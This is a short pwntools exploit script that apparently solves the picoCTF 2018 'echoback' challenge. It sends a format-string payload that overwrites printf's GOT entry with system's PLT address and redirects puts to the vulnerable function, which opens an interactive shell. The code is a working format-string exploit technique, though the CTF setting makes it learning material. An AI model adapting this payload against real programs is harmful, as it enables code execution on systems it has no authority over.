
#!/usr/bin/python2

from pwn import *
import sys

LOCAL = True

context.arch = 'x86_64'

SYSTEM_PLT = 0x08048460
PRINTF_GOT = 0x0804a010
VULN = 0x080485ab
PUTS_GOT = 0x0804a01c

def info(s):
	log.info(s)

def exploit(r):
	r.recvuntil("message:")

	# overwrite puts got 0x0804a01c with vlun function address 0x85ab (loop)
	# write system_plt 0x08048460 (0x0804 and 0x8460) to printf got 0x0804a010
	"""
		Write system plt on printf got
		1. write 0x0804 on 0x0804a012
		2. write 0x8460 on 0x0804a010
		
		Write LOW address of vuln on puts got
		3. write 0x85ab on 0x0804a01c
	"""
	pay = p32(PRINTF_GOT + 2)
	pay += p32(PRINTF_GOT)
	pay += p32(PUTS_GOT)
	pay += "%02040x%7$hn"
	pay += "%31836x%8$hn"
	pay += "%00331x%9$hn"

	r.sendline(pay)
	r.interactive()
	return


if __name__ == '__main__':
    
	# e = ELF('./echoback')
	HOST , PORT = "2018shell2.picoctf.com",22462
	if len(sys.argv) > 1:
		r = remote(HOST,PORT)
		exploit(r)
	else:
		r = process(['./echoback'])
		print util.proc.pidof(r)
		pause()
		exploit(r)
        
